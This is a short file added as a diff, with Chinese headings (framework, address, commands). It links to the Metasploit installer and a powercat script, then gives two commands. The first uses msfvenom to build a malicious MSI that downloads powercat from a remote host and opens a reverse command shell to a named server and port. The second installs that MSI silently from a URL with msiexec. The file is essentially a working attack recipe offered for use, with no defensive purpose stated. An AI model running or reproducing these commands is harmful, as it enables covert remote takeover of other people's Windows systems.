@@ -1,0 +1,10 @@
+框架: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+
+https://windows.metasploit.com/metasploitframework-latest.msi
+
+地址：
+https://github.com/rexpository/powercat-v2.0/blob/main/powercat.ps1
+
+命令：
+1. msfvenom -p windows/exec CMD="powershell IEX (New-Object System.Net.Webclient).DownloadString('https://dabiaoge.eu.org/powercat.ps1'); powercat -c xy.yibin.eu.org -p 8889 -e cmd" -f msi > evil.msi
+2. msiexec /q /i https://dabiaoge.eu.org/evil/evil.msi
